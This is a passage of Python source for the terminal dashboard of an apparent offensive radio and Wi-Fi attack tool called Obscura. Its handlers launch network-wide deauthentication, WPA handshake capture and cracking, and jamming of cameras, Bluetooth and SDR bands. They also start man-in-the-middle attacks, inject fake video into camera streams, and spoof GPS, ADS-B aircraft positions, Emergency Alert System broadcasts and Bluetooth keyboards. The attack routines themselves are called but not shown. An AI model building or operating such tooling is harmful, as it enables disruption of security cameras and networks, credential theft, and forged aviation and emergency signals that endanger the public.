    }
    Button:hover {
        background: #006600;
    }
    Container {
        layout: grid;
        grid-size: 2;
        grid-gutter: 1;
    }
    #viz_split {
        layout: grid;
        grid-size: 2;
        grid-gutter: 1;
    }
    .error-label {
        color: #FF0000;
    }
    .title {
        text-align: center;
        text-style: bold;
    }
    .status-badge {
        margin: 0 1;
        padding: 0 1;
        border: solid #00FF00;
    }
    """

    def __init__(self, detected_networks_queue, detected_cameras_queue, orchestrator):
        super().__init__()
        self.detected_networks_queue = detected_networks_queue
        self.detected_cameras_queue = detected_cameras_queue
        self.orchestrator = orchestrator
        self.detected_networks = {}
        self.detected_cameras = {}
        self.packet_count = 0
        self.packet_counts = {"Beacon": 0, "Probe": 0, "Data": 0, "Other": 0}
        self.start_time = time.time()
        self.handshakes = []
        self.vulnerabilities = []
        self.bluetooth_devices = []
        self.captured_packets = []
        self.selected_camera_mac = None
        self.selected_network_bssid = None
        self.action_history = []
        self.debug_logs = []
        self.attack_status = {
            "Camera Jamming": "Inactive",
            "Bluetooth Jamming": "Inactive",
            "Deauth All": "Inactive",
            "SDR Jamming": "Inactive",
            "Hybrid Jamming": "Inactive",
            "MitM": "Inactive",
            "GPS Spoofing": "Inactive",
        }
        self.show_handshake_table = False
        self.show_debug_logs = False
        self.progress_tasks = {}
        self.camera_jamming_active = False
        self.camera_jamming_lock = threading.Lock()
        self.mitm_active = False
        self.gps_spoofing_active = False
        self.obscura_theme = load_config().get("theme", "dark")
        self.stream_widget = None
        self.stream_active = False
        self.last_gps_coords = None
        self.packet_buffer = []
        self.last_updated = {"networks": None, "cameras": None, "packets": None}
        self.device_tags = {}
        self.preferred_port = load_config().get("preferred_port", 8080)
        self.last_attack = load_config().get("last_attack", "camera_jam")
        self.packet_counts_history = []
        if not hasattr(self.orchestrator, "battery_saver"):
            self.orchestrator.battery_saver = load_config().get("battery_saver", False)
        self.matrix_rain_enabled = False
        self.matrix_rain_widget = None

    def increment_packet_count(self):
        """Increment the packet count for display in the UI."""
        self.packet_count += 1

    def compose(self) -> ComposeResult:
        yield Header()
        yield Static("Obscura v1.1 | Welcome, User | Uptime: 0s", id="header_text")
        with Container(id="status_bar"):
            for attack in self.attack_status:
                yield Static(
                    "", id=f"status_{attack.replace(' ', '_')}", classes="status-badge"
                )
        yield Static(id="mode_indicator")
        yield Static(id="channel_display")

        with TabbedContent(initial="dashboard"):
            with TabPane("🌐 Dashboard", id="dashboard"):
                yield Static(id="dashboard_summary")
                yield RichLog(id="attack_log")

            with TabPane("🔍 Monitoring", id="monitoring"):
                yield Input(
                    id="global_search",
                    placeholder="Search across tables...",
                    tooltip="Search networks and cameras",
                )
                yield Label("Detected Networks")
                yield Static("", id="networks_updated")
                yield DataTable(id="network_table")
                yield Label("Detected Cameras")
                yield Static("", id="cameras_updated")
                yield DataTable(id="camera_table")
                yield ContentSwitcher(
                    StreamWidget(id="stream_widget"),
                    Static("No stream active", id="no_stream"),
                    id="stream_switcher",
                    initial="no_stream",
                )
                yield DataTable(id="bluetooth_table")
                yield DataTable(id="active_attacks_table")

            with TabPane("⚡ Actions", id="actions"):
                yield Label("Spoofing Actions")
                yield Button("GPS Spoof", id="gps_spoof", tooltip="Start GPS spoofing")
                yield Button(
                    "Preview Injected Stream",
                    id="preview_injected_stream",
                    tooltip="Preview injected stream",
                )
                yield Label("MitM Controls")
                yield Button("Start MitM", id="start_mitm", tooltip="Start MitM attack")
                yield Button(
                    "Run Hybrid Chain",
                    id="run_hybrid_chain",
                    tooltip="Run hybrid attack chain",
                )

            with TabPane("📊 Metrics", id="metrics"):
                yield Label("Advanced Metrics")
                yield Static(id="advanced_metrics")
                yield Static(id="packet_sparkline")

            with TabPane("📈 Visualization", id="visualization"):
                with Container(id="viz_split"):
                    yield Static(id="packet_viz")
                    yield Static(id="gps_map")

            with TabPane("🗺️ Map", id="map"):
                yield Label("GPS Spoofing Map")
                yield Static(id="gps_map_old")

            with TabPane("🔄 Replay", id="replay"):
                yield Label("Captured Packets for Replay")
                yield Static("", id="packets_updated")
                yield DataTable(id="packet_table")

            with TabPane("⚡ Actions", id="actions_plugins"):
                yield Button("List Plugins", id="list_plugins", tooltip="View and load available plugins")

        yield Container(id="progress_container")

        with VerticalScroll(id="logs_container"):
            yield Label("SYSLOG")
            yield RichLog(id="action_history")
            yield RichLog(id="debug_log")
            yield Button(
                "Toggle Debug Logs", id="toggle_debug", tooltip="Show/hide debug logs"
            )
            yield Switch(id="debug_toggle", value=False)

        yield Footer()


    def on_mount(self) -> None:
        network_table = self.query_one("#network_table", DataTable)
        network_table.add_columns("MAC", "SSID", "Signal", "Channel", "MFP")
        network_table.cursor_type = "row"
        network_table.zebra_stripes = True

        camera_table = self.query_one("#camera_table", DataTable)
        camera_table.add_columns(
            "MAC",
            "SSID",
            "Vendor",
            "Score",
            "Signal",
            "Deauth Status",
            "Discovery",
            "Entropy",
            "Traits",
            "Tags",
            "Vulnerabilities",
        )
        camera_table.cursor_type = "row"
        camera_table.zebra_stripes = True

        packet_table = self.query_one("#packet_table", DataTable)
        packet_table.add_columns(
            "Packet ID", "Type", "Source", "Destination", "Timestamp"
        )

        bluetooth_table = self.query_one("#bluetooth_table", DataTable)
        bluetooth_table.add_columns("MAC", "Name", "Type", "RSSI", "Services")

        active_attacks_table = self.query_one("#active_attacks_table", DataTable)
        active_attacks_table.add_columns("Attack", "Target", "Status")

        self.update_initial_content()
        self.set_interval(2.0, self.refresh_ui)
        self.set_interval(5.0, self.update_camera_stream)
        self.set_interval(30.0, self.action_send_probe_request)
        self.set_interval(5.0, self.update_packet_visualization)
        self.set_interval(5.0, self.update_advanced_metrics)
        self.set_interval(2.0, self.update_attack_log)
        self.set_interval(1.0, self.update_mode_indicator)
        self.set_interval(5.0, self.update_channel_display)
        self.set_interval(3.0, self.update_active_attacks)
        self.apply_theme(self.obscura_theme, save=False)
        self.update_status_bar()

    def update_initial_content(self) -> None:
        self.query_one("#dashboard_summary", Static).update(self.get_dashboard_text())
        self.query_one("#advanced_metrics", Static).update(
            "Advanced metrics initializing..."
        )
        self.query_one("#packet_viz", Static).update(
            "Packet visualization initializing..."
        )
        self.query_one("#gps_map", Static).update("GPS map initializing...")
        self.query_one("#gps_map_old", Static).update("GPS map initializing...")

    async def refresh_ui(self) -> None:
        with detected_networks_lock:
            while not self.detected_networks_queue.empty():
                data = self.detected_networks_queue.get()
                self.detected_networks.update(data)
                self.increment_packet_count()

        with detected_cameras_lock:
            while not self.detected_cameras_queue.empty():
                data = self.detected_cameras_queue.get()
                for mac, info in data.items():
                    if info:
                        self.detected_cameras[mac] = info
                    else:
                        self.detected_cameras.pop(mac, None)

        current_tab = self.query_one(TabbedContent).active
        if current_tab in ("monitoring", "replay"):
            self.update_network_table()
            self.update_camera_table()
            self.update_packet_table()

        self.update_progress_bars()
        self.update_logs()
        self.query_one("#dashboard_summary", Static).update(self.get_dashboard_text())
        self.query_one("#header_text", Static).update(
            f"Obscura v1.1 | Welcome, User | Uptime: {int(time.time() - self.start_time)}s"
        )
        self.update_status_bar()

    def update_status_bar(self):
        for attack, status in self.attack_status.items():
            badge = self.query_one(f"#status_{attack.replace(' ', '_')}", Static)
            color = (
                "green"
                if status == "Active"
                else "red" if status == "Inactive" else "yellow"
            )
            badge.update(f"[{color}]{attack}: {status}[/]")

    def get_dashboard_text(self) -> str:
        num_networks = len(self.detected_networks)
        num_cameras = len(self.detected_cameras)
        active_attacks = [k for k, v in self.attack_status.items() if v == "Active"]
        return f"Networks: {num_networks}\nCameras: {num_cameras}\nActive Attacks: {', '.join(active_attacks) or 'None'}\nPackets: {self.packet_count or 0}"

    def update_network_table(self):
        with detected_networks_lock:
            while not self.detected_networks_queue.empty():
                data = self.detected_networks_queue.get()
                self.detected_networks.update(data)
                self.increment_packet_count()

        table = self.query_one("#network_table", DataTable)
        table.clear()

        search_term = self.query_one("#global_search", Input).value.strip().lower()

        for bssid, info in self.detected_networks.items():
            ssid = info.get("ssid", "<Hidden>")
            if (
                not search_term
                or search_term in bssid.lower()
                or search_term in ssid.lower()
            ):
                signal = info.get("signal", -100)
                channel = info.get("channel", "N/A")
                mfp = "✓" if info.get("mfp", False) else "✗"
                signal_icon = (
                    "🟢" if signal >= -40 else "🟡" if -70 <= signal < -40 else "🔴"
                )
                table.add_row(
                    f"{signal_icon} {bssid}",
                    ssid,
                    f"{signal} dBm",
                    f"Ch {channel}",
                    mfp,
                )

        self.last_updated["networks"] = datetime.now()
        self.query_one("#networks_updated", Static).update(
            f"Last updated: {self.last_updated['networks'].strftime('%H:%M:%S')}"
        )

    def update_camera_table(self):
        with detected_cameras_lock:
            while not self.detected_cameras_queue.empty():
                data = self.detected_cameras_queue.get()
                self.packet_buffer.append(data)

        table = self.query_one("#camera_table", DataTable)
        table.clear()

        search_term = self.query_one("#global_search", Input).value.strip().lower()

        for mac, info in self.detected_cameras.items():
            ssid = info.get("ssid", "")
            if (
                not search_term
                or search_term in mac.lower()
                or search_term in ssid.lower()
            ):
                deauth_status = (
                    "Deauthed" if info.get("deauthed", False) else "Connected"
                )
                discovery = info.get("discovery", "Unknown")
                entropy = info.get("entropy", 0)
                entropy_bar = "[" + "#" * int(entropy) + "-" * (10 - int(entropy)) + "]"
                traits = ", ".join(info.get("traits", [])) or "None"
                tags = ", ".join(self.device_tags.get(mac, []))
                vuln_count = len(self.orchestrator.vuln_cache.get(mac, []))
                priority = self.orchestrator.target_priority.get(mac, 0)
                priority_icon = (
                    "🟥" if priority > 70 else "🟨" if 30 < priority <= 70 else "🟩"
                )
                table.add_row(
                    f"{priority_icon} {mac}",
                    ssid,
                    info.get("vendor", "Unknown"),
                    f"{info.get('score', 0)}",
                    f"{info.get('signal', 'N/A')}dBm",
                    deauth_status,
                    discovery,
                    entropy_bar,
                    traits,
                    tags,
                    str(vuln_count),
                )

        self.last_updated["cameras"] = datetime.now()
        self.query_one("#cameras_updated", Static).update(
            f"Last updated: {self.last_updated['cameras'].strftime('%H:%M:%S')}"
        )

    def update_packet_table(self):
        table = self.query_one("#packet_table", DataTable)
        table.clear()
        search_term = self.query_one("#global_search", Input).value.lower()
        for pkt in self.captured_packets[-50:]:
            if search_term in pkt["src"].lower() or search_term in pkt["dst"].lower():
                table.add_row(
                    str(pkt["id"]),
                    pkt["type"],
                    pkt["src"],
                    pkt["dst"],
                    pkt["timestamp"],
                )
        self.last_updated["packets"] = datetime.now()
        self.query_one("#packets_updated", Static).update(
            f"Last updated: {self.last_updated['packets'].strftime('%H:%M:%S')}"
        )

    def update_progress_bars(self):
        container = self.query_one("#progress_container", Container)
        for child in container.children[:]:
            child.remove()
        for task, (progress, total) in self.progress_tasks.items():
            label = Label(f"{task}: {progress}/{total}")
            pb = ProgressBar(total=total, show_percentage=True, id=f"pb_{task}")
            pb.advance(progress)
            container.mount(label)
            container.mount(pb)

    def update_logs(self):
        action_log = self.query_one("#action_history", RichLog)
        debug_log = self.query_one("#debug_log", RichLog)
        action_log.clear()
        for entry in self.action_history[-50:]:
            action_log.write(entry["message"])
            action_log.scroll_end()
        debug_log.clear()
        if self.show_debug_logs:
            for msg in self.debug_logs[-50:]:
                debug_log.write(msg)
            debug_log.scroll_end()

    def action_toggle_matrix_rain(self):
        self.matrix_rain_enabled = not self.matrix_rain_enabled
        if self.matrix_rain_enabled:
            if not self.matrix_rain_widget:
                self.matrix_rain_widget = MatrixRain(id="matrix_bg")
                self.mount(self.matrix_rain_widget, before="#header_text")
            self.matrix_rain_widget.styles.display = "block"
            self.notify("[green]Matrix Rain enabled[/]")
        else:
            if self.matrix_rain_widget:
                self.matrix_rain_widget.styles.display = "none"
            self.notify("[yellow]Matrix Rain disabled[/]")

    def action_launch_satellite_dashboard(self):
        if hasattr(self.orchestrator, "launch_satellite_dashboard"):
            self.orchestrator.launch_satellite_dashboard()
        else:
            self.push_screen(GlitchAlert("Satellite Dashboard not available"))


    def add_handshake(self, bssid, cap_file):
        self.handshakes.append(
            {
                "bssid": bssid,
                "file": cap_file,
                "cracked": False,
                "password": None,
                "progress": "0%",
            }
        )
        self.notify(f"Handshake captured for {bssid}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Handshake captured: {bssid}",
            "info",
        )

    def update_handshake_status(self, bssid, cracked, password=None, progress="100%"):
        for hs in self.handshakes:
            if hs["bssid"] == bssid:
                hs.update(
                    {
                        "cracked": cracked,
                        "password": password if cracked else None,
                        "progress": progress,
                    }
                )
                status = "cracked" if cracked else "failed"
                self.notify(f"Handshake {status} for {bssid}")
                self.add_action_history(
                    f"[{datetime.now().strftime('%H:%M:%S')}] Handshake {status}: {bssid}",
                    "info" if cracked else "error",
                )
                break

    def add_vulnerability(self, camera_mac, vulnerabilities):
        self.vulnerabilities.append(
            {"mac": camera_mac, "vulnerabilities": vulnerabilities}
        )

    def add_bluetooth_device(self, mac, name, device_type, rssi, services):
        table = self.query_one("#bluetooth_table", DataTable)
        table.add_row(mac, name, device_type, rssi, ", ".join(services))

    def add_captured_packet(self, pkt):
        pkt_id = len(self.captured_packets)
        pkt_type = "Unknown"
        src = pkt.getlayer(scapy.Dot11).addr2 if pkt.haslayer(scapy.Dot11) else "N/A"
        dst = pkt.getlayer(scapy.Dot11).addr1 if pkt.haslayer(scapy.Dot11) else "N/A"
        if pkt.haslayer(scapy.Dot11Beacon):
            pkt_type = "Beacon"
            self.packet_counts["Beacon"] += 1
        elif pkt.haslayer(scapy.Dot11ProbeReq) or pkt.haslayer(scapy.Dot11ProbeResp):
            pkt_type = "Probe"
            self.packet_counts["Probe"] += 1
        elif pkt.type == 2:
            pkt_type = "Data"
            self.packet_counts["Data"] += 1
        else:
            self.packet_counts["Other"] += 1
        self.captured_packets.append(
            {
                "id": pkt_id,
                "packet": pkt,
                "type": pkt_type,
                "src": src,
                "dst": dst,
                "timestamp": datetime.now().strftime("%H:%M:%S"),
            }
        )

    def action_switch_tab(self, tab_id: str):
        self.query_one(TabbedContent).active = tab_id

    def action_toggle_camera_jamming(self):
        self.push_screen(
            ConfirmDialog("Toggle Camera Jamming?"),
            lambda confirmed: self._toggle_camera_jamming(confirmed),
        )

    def _toggle_camera_jamming(self, confirmed: bool):
        global camera_jamming_active
        if not confirmed:
            self.notify("Camera Jamming canceled")
            return
        with self.camera_jamming_lock:
            self.camera_jamming_active = not self.camera_jamming_active
            camera_jamming_active = self.camera_jamming_active
            self.attack_status["Camera Jamming"] = (
                "Active" if self.camera_jamming_active else "Inactive"
            )
            self.notify(
                f"Camera Jamming {'Active' if self.camera_jamming_active else 'Inactive'}"
            )
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] Camera Jamming: {self.attack_status['Camera Jamming']}",
                "info",
            )
            if self.camera_jamming_active:
                self.progress_tasks["Camera Jamming"] = (0, 100)
                threading.Thread(
                    target=camera_jamming_thread,
                    args=(self.orchestrator, self),
                    daemon=True,
                ).start()

    def action_start_bluetooth_jamming(self):
        self.push_screen(
            ConfirmDialog("Start Bluetooth Jamming?"),
            lambda confirmed: self._start_bluetooth_jamming(confirmed),
        )

    def _start_bluetooth_jamming(self, confirmed: bool):
        if not confirmed:
            self.notify("Bluetooth Jamming canceled")
            return
        self.attack_status["Bluetooth Jamming"] = "Active"
        self.notify("Bluetooth Jamming Started")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Bluetooth Jamming Started", "info"
        )
        self.progress_tasks["Bluetooth Jamming"] = (0, 50)
        threading.Thread(
            target=bluetooth_jam, args=(self.orchestrator, self), daemon=True
        ).start()

    def action_toggle_deauth(self):
        self.push_screen(
            ConfirmDialog("Toggle Deauth All?"),
            lambda confirmed: self._toggle_deauth(confirmed),
        )

    def _toggle_deauth(self, confirmed: bool):
        global network_deauth_active
        if not confirmed:
            self.notify("Deauth All canceled")
            return
        network_deauth_active = not network_deauth_active
        self.attack_status["Deauth All"] = (
            "Active" if network_deauth_active else "Inactive"
        )
        self.notify(f"Deauth All {self.attack_status['Deauth All']}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Deauth All: {self.attack_status['Deauth All']}",
            "info",
        )
        if network_deauth_active:
            with detected_networks_lock:
                bssid_list = list(self.detected_networks.keys())
            if bssid_list:
                threading.Thread(
                    target=network_deauth_thread,
                    args=(
                        bssid_list,
                        self.orchestrator.interface,
                        self.orchestrator,
                        self,
                    ),
                    daemon=True,
                ).start()

    def action_toggle_sdr_jamming(self):
        self.push_screen(
            ConfirmDialog("Toggle SDR Jamming?"),
            lambda confirmed: self._toggle_sdr_jamming(confirmed),
        )

    def _toggle_sdr_jamming(self, confirmed: bool):
        global sdr_jamming_active
        if not confirmed:
            self.notify("SDR Jamming canceled")
            return
        sdr_jamming_active = not sdr_jamming_active
        self.attack_status["SDR Jamming"] = (
            "Active" if sdr_jamming_active else "Inactive"
        )
        self.notify(f"SDR Jamming {self.attack_status['SDR Jamming']}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] SDR Jamming: {self.attack_status['SDR Jamming']}",
            "info",
        )
        if sdr_jamming_active:
            with detected_networks_lock:
                if not self.detected_networks:
                    self.notify("[red]No networks detected[/]")
                    sdr_jamming_active = False
                    self.attack_status["SDR Jamming"] = "Inactive"
                    return
                bssid = max(
                    self.detected_networks.items(),
                    key=lambda x: x[1].get("signal", -100),
                )[0]
            threading.Thread(
                target=sdr_jamming_thread,
                args=(bssid, self.orchestrator, self),
                daemon=True,
            ).start()

    def action_toggle_hybrid_jamming(self):
        self.push_screen(
            ConfirmDialog("Toggle Hybrid Jamming?"),
            lambda confirmed: self._toggle_hybrid_jamming(confirmed),
        )

    def _toggle_hybrid_jamming(self, confirmed: bool):
        global hybrid_jamming_active
        if not confirmed:
            self.notify("Hybrid Jamming canceled")
            return
        hybrid_jamming_active = not hybrid_jamming_active
        self.attack_status["Hybrid Jamming"] = (
            "Active" if hybrid_jamming_active else "Inactive"
        )
        self.notify(f"Hybrid Jamming {self.attack_status['Hybrid Jamming']}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Hybrid Jamming: {self.attack_status['Hybrid Jamming']}",
            "info",
        )
        if hybrid_jamming_active:
            threading.Thread(
                target=hybrid_jamming_thread,
                args=(self.orchestrator, self),
                daemon=True,
            ).start()

    def action_start_mdns_ssdp_listeners(self):
        self.notify("Starting mDNS/SSDP listeners...")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Started mDNS/SSDP Listeners",
            "info",
        )
        threading.Thread(
            target=start_mdns_listener,
            args=(self.orchestrator.interface, self, self.orchestrator),
            daemon=True,
        ).start()
        threading.Thread(
            target=start_ssdp_listener,
            args=(self.orchestrator.interface, self, self.orchestrator),
            daemon=True,
        ).start()

    def action_discover_stream_urls(self):
        self.notify("Discovering stream URLs...")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Discovering Stream URLs", "info"
        )
        threading.Thread(target=self.discover_stream_urls_thread, daemon=True).start()

    def discover_stream_urls_thread(self):
        for mac in self.detected_cameras.keys():
            ip = self.detected_cameras[mac].get("ip")
            if ip:
                url = find_stream_url(ip)
                if url:
                    with detected_cameras_lock:
                        self.detected_cameras[mac]["stream_url"] = url
                    self.notify(f"Stream URL found for {mac}: {url}")
                    self.add_action_history(
                        f"[{datetime.now().strftime('%H:%M:%S')}] Stream URL: {mac} - {url}",
                        "info",
                    )

    def show_plugins(self):
        plugins = self.orchestrator.list_plugins()
        if not plugins:
            self.notify("[yellow]No plugins found in attack_plugins/[/]")
            return
        plugin_list = "\n".join(f"[green]+[/] {p}" for p in plugins)
        self.push_screen(
            GlitchAlert(f"Available Plugins:\n\n{plugin_list}\n\nRun 'load_plugin <name>'")
        )


    def action_voice_injection(self):
        self.push_screen(VoiceInputScreen(), self.handle_voice_input)

    def handle_voice_input(self, result):
        if result:
            audio_file, freq = result
            self.orchestrator.execute("voice", audio_file, float(freq))
            self.notify("[green]Voice Injection started[/]")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] Voice Injection at {freq} MHz",
                "info",
            )
        else:
            self.notify("Voice Injection canceled")

    def action_eas_alert_injection(self):
        self.push_screen(EASInputScreen(), self.handle_eas_input)

    def handle_eas_input(self, result):
        if result:
            message, lang = result
            eas_file = self.orchestrator.generate_eas_alert(message, lang)
            if eas_file:
                self.orchestrator.execute("voice", eas_file)
                self.notify("[green]EAS Alert injected[/]")
                self.add_action_history(
                    f"[{datetime.now().strftime('%H:%M:%S')}] EAS Alert Injected",
                    "info",
                )
            else:
                self.push_screen(GlitchAlert("EAS Generation Failed"))
        else:
            self.notify("EAS Injection canceled")

    def action_adsb_spoofing(self):
        self.push_screen(ADSBInputScreen(), self.handle_adsb_input)

    def handle_adsb_input(self, result):
        if result:
            callsign, lat, lon, message = result
            self.orchestrator.adsb_voice_alert(callsign, lat, lon, message)
            self.notify("[green]ADS-B Spoofing started[/]")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] ADS-B Spoofing: {callsign}",
                "info",
            )
        else:
            self.notify("ADS-B Spoofing canceled")

    def action_gps_spoofing(self):
        if not self.gps_spoofing_active:
            self.push_screen(GPSInputScreen(), self.handle_gps_input)
            self.query_one("#gps_spoof", Button).label = "Stop GPS Spoof"
        else:
            self.push_screen(
                ConfirmDialog("Stop GPS Spoofing?"),
                lambda confirmed: self._stop_gps_spoofing(confirmed),
            )

    def _stop_gps_spoofing(self, confirmed: bool):
        if confirmed:
            self.gps_spoofing_active = False
            self.attack_status["GPS Spoofing"] = "Inactive"
            self.notify("GPS Spoofing stopped")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] GPS Spoofing stopped", "info"
            )
            self.query_one("#gps_spoof", Button).label = "GPS Spoof"

    def handle_gps_input(self, result):
        if result and result[0] == "submit":
            lat, lon, alt = result[1]
            self.gps_spoofing_active = True
            self.attack_status["GPS Spoofing"] = "Active"
            self.last_gps_coords = (lat, lon)
            self.orchestrator.gps_spoof_sdr(lat, lon, self, alt)
            self.notify(f"[green]GPS Spoofing to ({lat}, {lon}, {alt}m)[/]")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] GPS Spoofing: ({lat}, {lon}, {alt}m)",
                "info",
            )
            self.update_gps_map()
        else:
            self.notify("GPS Spoofing canceled")
            self.query_one("#gps_spoof", Button).label = "GPS Spoof"

    def action_bettercap_mitm(self):
        if not self.mitm_active:
            self.push_screen(MitMInputScreen(), self.handle_mitm_input)
            self.query_one("#start_mitm", Button).label = "Stop MitM"
        else:
            self.push_screen(
                ConfirmDialog("Stop MitM?"),
                lambda confirmed: self._stop_mitm(confirmed),
            )

    def _stop_mitm(self, confirmed: bool):
        if confirmed:
            self.mitm_active = False
            self.attack_status["MitM"] = "Inactive"
            self.notify("MitM stopped")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] MitM stopped", "info"
            )
            self.query_one("#start_mitm", Button).label = "Start MitM"

    def handle_mitm_input(self, result):
        if result:
            victim_ip, camera_ip = result
            self.mitm_active = True
            self.attack_status["MitM"] = "Active"
            self.orchestrator.start_bettercap_mitm(victim_ip, camera_ip, self)
            self.notify(f"[green]MitM started: {victim_ip} -> {camera_ip}[/]")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] MitM: {victim_ip} -> {camera_ip}",
                "info",
            )
        else:
            self.notify("MitM canceled")
            self.query_one("#start_mitm", Button).label = "Start MitM"

    def action_rtsp_injection(self):
        self.push_screen(RTSPInputScreen(), self.handle_rtsp_input)

    def handle_rtsp_input(self, result):
        if result:
            camera_ip, victim_ip, video = result
            ffmpeg_proc, arpspoof_proc = self.orchestrator.start_rtsp_injection(
                camera_ip, victim_ip, video, self
            )
            if ffmpeg_proc and arpspoof_proc:
                self.progress_tasks["RTSP Injection"] = (0, 100)
                self.notify("[green]RTSP Injection started[/]")
                self.add_action_history(
                    f"[{datetime.now().strftime('%H:%M:%S')}] RTSP Injection: {camera_ip} -> {victim_ip}",
                    "info",
                )
            else:
                self.push_screen(GlitchAlert("RTSP Injection Failed"))
        else:
            self.notify("RTSP Injection canceled")

    def action_mjpeg_injection(self):
        self.push_screen(MJPEGInputScreen(), self.handle_mjpeg_input)

    def handle_mjpeg_input(self, result):
        if result:
            source_path = result
            if self.orchestrator.start_mjpeg_injection(source_path, self):
                self.progress_tasks["MJPEG Injection"] = (0, 100)
                self.notify("[green]MJPEG Injection started[/]")
                self.add_action_history(
                    f"[{datetime.now().strftime('%H:%M:%S')}] MJPEG Injection: {source_path}",
                    "info",
                )
            else:
                self.push_screen(GlitchAlert("MJPEG Injection Failed"))
        else:
            self.notify("MJPEG Injection canceled")

    def action_rtp_injection(self):
        self.push_screen(RTPInputScreen(), self.handle_rtp_input)

    def handle_rtp_input(self, result):
        if result:
            camera_ip, video = result
            proc = self.orchestrator.start_rtp_injection(camera_ip, video, self)
            if proc:
                self.progress_tasks["RTP Injection"] = (0, 100)
                self.notify("[green]RTP Injection started[/]")
                self.add_action_history(
                    f"[{datetime.now().strftime('%H:%M:%S')}] RTP Injection: {camera_ip}",
                    "info",
                )
            else:
                self.push_screen(GlitchAlert("RTP Injection Failed"))
        else:
            self.notify("RTP Injection canceled")

    def action_bluetooth_hid_spoof(self):
        self.push_screen(HIDInputScreen(), self.handle_hid_input)

    def handle_hid_input(self, result):
        if result:
            mac = result
            self.orchestrator.bluetooth_hid_spoof(mac)
            self.notify("[green]HID Spoofing started[/]")
            self.add_action_history(
                f"[{datetime.now().strftime('%H:%M:%S')}] HID Spoofing: {mac}", "info"
            )
        else:
            self.notify("HID Spoofing canceled")

    def action_send_probe_request(self):
        self.notify("Sending probe request...")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Probe Request Sent", "info"
        )
        send_probe_request(self.orchestrator.interface, self)

    def action_capture_handshake(self):
        if not self.selected_network_bssid:
            self.push_screen(GlitchAlert("No Network Selected"))
            return
        self.push_screen(
            ConfirmDialog(f"Capture handshake for {self.selected_network_bssid}?"),
            lambda confirmed: self._capture_handshake(confirmed),
        )

    def _capture_handshake(self, confirmed: bool):
        global network_deauth_active
        if not confirmed:
            self.notify("Handshake capture canceled")
            return
        network_deauth_active = True
        threading.Thread(
            target=network_deauth_thread,
            args=(
                [self.selected_network_bssid],
                self.orchestrator.interface,
                self.orchestrator,
                self,
            ),
            daemon=True,
        ).start()
        self.notify(f"Capturing handshake for {self.selected_network_bssid}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Capturing Handshake: {self.selected_network_bssid}",
            "info",
        )
        self.progress_tasks["Handshake Capture"] = (0, 100)

    def action_crack_handshake(self):
        if not self.handshakes:
            self.push_screen(GlitchAlert("No Handshakes Captured"))
            return
        hs = self.handshakes[-1]
        self.push_screen(
            ConfirmDialog(f"Crack handshake for {hs['bssid']}?"),
            lambda confirmed: self._crack_handshake(confirmed, hs),
        )

    def _crack_handshake(self, confirmed: bool, hs):
        if not confirmed:
            self.notify("Handshake cracking canceled")
            return
        self.notify(f"Cracking handshake for {hs['bssid']}")
        self.add_action_history(
            f"[{datetime.now().strftime('%H:%M:%S')}] Cracking Handshake: {hs['bssid']}",
            "info",
        )
        self.progress_tasks["Handshake Cracking"] = (0, 100)
        threading.Thread(
            target=self.crack_handshake_thread,
            args=(hs["file"], hs["bssid"]),
            daemon=True,
        ).start()

    def crack_handshake_thread(self, cap_file, bssid):
        for i in range(100):
            time.sleep(0.5)
            self.progress_tasks["Handshake Cracking"] = (i + 1, 100)
        password = crack_handshake(cap_file, bssid, self)
        self.update_handshake_status(bssid, password is not None, password)
        self.progress_tasks.pop("Handshake Cracking", None)

    def action_toggle_handshake_table(self):
        self.show_handshake_table = not self.show_handshake_table
        self.notify(
            f"Handshake table {'shown' if self.show_handshake_table else 'hidden'}"
        )

    def action_focus_logs(self):
        try:
            self.query_one("#action_history", RichLog).focus()
        except NoMatches:
            self.notify("Logs not available")

    def action_toggle_stream_preview(self):
        if (
            not self.selected_camera_mac
            or self.selected_camera_mac not in self.detected_cameras
        ):
            self.push_screen(GlitchAlert("No Camera Selected"))
            return
        stream_url = self.detected_cameras[self.selected_camera_mac].get("stream_url")
        if not stream_url or not stream_url.startswith("http"):
            self.push_screen(GlitchAlert("No Valid Stream URL"))
            return
        if self.stream_active:
            self.stream_widget.stop_stream()
            self.query_one("#stream_switcher", ContentSwitcher).current = "no_stream"
            self.stream_active = False
            self.notify("[yellow]Stream Preview stopped[/]")
        else:
            self.stream_widget = self.query_one("#stream_widget", StreamWidget)
            self.stream_widget.url = stream_url
            self.stream_widget.start_stream()
            self.query_one("#stream_switcher", ContentSwitcher).current = (
                "stream_widget"
            )
            self.stream_active = True
            self.notify("[green]Stream Preview started[/]")

    def action_launch_external_viewer(self):
        if (
            not self.selected_camera_mac
            or self.selected_camera_mac not in self.detected_cameras
        ):
            self.push_screen(GlitchAlert("No Camera Selected"))
            return
        stream_url = self.detected_cameras[self.selected_camera_mac].get("stream_url")
        if not stream_url:
            self.push_screen(GlitchAlert("No Stream URL"))
            return
        try:
            subprocess.Popen(
                ["vlc", stream_url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            self.notify("[green]VLC launched[/]")
        except Exception as e:
            self.push_screen(GlitchAlert(f"VLC Launch Failed: {e}"))

    def action_live_python_shell(self):
        self.notify("Opening Python shell...")
        console = code.InteractiveConsole(
            locals={"app": self, "orchestrator": self.orchestrator}
        )
        console.interact(banner="Obscura Python Shell - exit() to return")

    def action_scroll_down_networks(self):
        table = self.query_one("#network_table", DataTable)
        if table.cursor_row < table.row_count - 1:
            table.move_cursor(row=table.cursor_row + 1)

    def action_scroll_up_networks(self):
